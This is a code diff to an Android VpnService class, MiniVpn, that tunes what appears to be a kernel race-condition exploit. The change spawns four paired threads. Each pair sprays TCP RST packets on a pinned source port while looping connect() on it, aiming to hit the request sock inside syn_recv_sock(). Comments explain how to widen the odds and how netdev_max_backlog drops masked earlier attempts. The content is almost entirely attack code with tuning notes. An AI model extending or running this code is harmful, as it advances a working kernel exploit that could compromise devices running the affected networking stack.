@@ -62,6 +62,13 @@ public class MiniVpn extends VpnService implements Runnable {
      * and ACK inside the same syscall and the request sock is gone.
      */
     static final int PINNED_SPORT = 39999;
+    /**
+     * Independent (spray + connect) pairs. Hitting the request sock at all is
+     * rare; hitting it inside syn_recv_sock() is two orders of magnitude
+     * rarer, because that window is a few microseconds while the request sock
+     * itself lives for hundreds. More workers is the only lever that scales.
+     */
+    static final int WORKERS = 4;
 
     static volatile String status = "idle";
     static final AtomicLong rounds = new AtomicLong();
@@ -106,29 +113,40 @@ public class MiniVpn extends VpnService implements Runnable {
         startListener();
         sleepQuiet(300);
 
-        Thread spray = new Thread(new Runnable() {
-            @Override
-            public void run() {
-                sprayLoop();
-            }
-        }, "spray");
-        spray.start();
+        for (int w = 0; w < WORKERS; w++) {
+            final int sport = PINNED_SPORT - w;
 
-        clientLoop();
+            Thread spray = new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    sprayLoop(sport);
+                }
+            }, "spray" + w);
+            spray.start();
+
+            Thread conn = new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    clientLoop(sport);
+                }
+            }, "conn" + w);
+            conn.start();
+        }
     }
 
     /**
-     * Continuous RST stream on the pinned source port. It runs for the whole
-     * session, so some RST is always in flight while connect() is walking the
-     * handshake, instead of arriving only after the fact.
+     * Continuous RST stream on one pinned source port, paired with the connect
+     * loop that uses the same port. It runs for the whole session, so some RST
+     * is always in flight while connect() is walking the handshake, instead of
+     * arriving only after the fact.
      *
      * The batch is deliberately small and followed by a yield: writing flat out
      * overflows netdev_max_backlog (default 1000), and those drops do not show
      * up in any IP counter, which is what made the earlier runs look like the
      * RSTs were being ignored by the socket layer.
      */
-    private void sprayLoop() {
-        byte[] pkt = buildRst(PINNED_SPORT);
+    private void sprayLoop(int sport) {
+        byte[] pkt = buildRst(sport);
         while (running) {
             for (int k = 0; k < BURST; k++) {
                 try {
@@ -166,14 +184,14 @@ public class MiniVpn extends VpnService implements Runnable {
         t.start();
     }
 
-    private void clientLoop() {
+    private void clientLoop(int sport) {
         final InetAddress local = resolve(IP);
         if (local == null) {
             status = "bad ip";
             return;
         }
         final InetSocketAddress target = new InetSocketAddress(local, PORT);
-        final InetSocketAddress source = new InetSocketAddress(local, PINNED_SPORT);
+        final InetSocketAddress source = new InetSocketAddress(local, sport);
 
         int i = 0;
         while (running) {
